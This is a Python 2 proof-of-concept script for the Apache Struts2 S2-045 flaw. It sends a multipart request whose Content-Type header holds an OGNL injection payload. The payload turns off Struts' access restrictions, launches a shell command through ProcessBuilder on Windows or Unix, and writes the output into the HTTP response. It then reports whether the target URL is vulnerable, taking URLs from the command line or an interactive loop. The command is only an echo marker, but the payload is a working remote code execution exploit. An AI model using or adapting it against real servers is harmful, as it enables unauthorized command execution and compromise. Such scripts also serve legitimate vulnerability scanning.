#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib2
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import sys
def poc(url):
    register_openers()
    datagen, header = multipart_encode({"image1": '23333'})
    #datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]='''%{(#nike='multipart/form-data').
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
    (#_memberAccess?(#_memberAccess=#dm):
    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm)))).(#cmd='echo s2-045-s2-045').
    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
    (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
    (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
    getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
    (#ros.flush())}'''
    request = urllib2.Request(url,datagen,headers=header)
    response = urllib2.urlopen(request,timeout=3)
    page = response.read()
    response.close()
    if 's2-045-s2-045' in page:
        print('VULNERABLE--'+url)
        return 1
    else:
        print('NOT VULNERABLE--'+url)
        return 0

def isOrNot(url):
    if poc(url):
       print "VULNERABLE"
    else:
       print "not vulnerable"

if __name__ == '__main__':
    if len(sys.argv) == 2:
       isOrNot(sys.argv[1])
        
    else:
        while 1:
            try:
                url = raw_input('>>')
                if url=='q':
                    sys.exit();
                else:
                    print("url: "+url)
                    isOrNot(url)
            except Exception as e:
                print str(e)




